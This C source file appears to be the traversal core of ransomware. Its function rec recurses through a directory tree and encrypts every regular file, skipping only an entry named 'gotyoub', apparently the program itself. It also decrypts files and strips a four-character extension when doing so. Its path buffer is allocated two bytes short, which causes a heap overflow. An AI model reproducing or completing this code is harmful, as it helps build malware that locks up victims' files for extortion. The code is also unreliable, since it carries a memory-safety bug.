#include <sys/stat.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "encrypt.h"
#include "decrypt.h"


int is_regular_file(const char *path){
  struct stat path_stat;
  stat(path, &path_stat);
  return S_ISREG(path_stat.st_mode);
}

void rec(const char *dname, void (*encdec)(char*)){
  DIR *d;
  struct dirent *dir;
  d = opendir(dname);
  if (d) {
    while ((dir = readdir(d)) != NULL) {
      if(strcmp(dir->d_name,".") && strcmp(dir->d_name,"..") && strcmp(dir->d_name,"gotyoub")){
        char* fullpath=malloc(strlen(dname)+strlen(dir->d_name)+1);
        strcpy(fullpath, dname);
        strcat(fullpath, "/");
        strcat(fullpath, dir->d_name);
        if(is_regular_file(fullpath)){
          if (encdec==&decrypt_file){
            printf("decrypting:%s\n", fullpath);
            fullpath[strlen(fullpath)-4]='\0';
          } else {
            printf("encrypting:%s\n", fullpath);
          }
          encdec(fullpath);
        } else {
          printf(" entering :%s\n", fullpath);
          rec(fullpath, encdec);
          printf(" exiting  :%s\n", fullpath);
        }
        
        free(fullpath);
      }
    }
    closedir(d);
  }
}
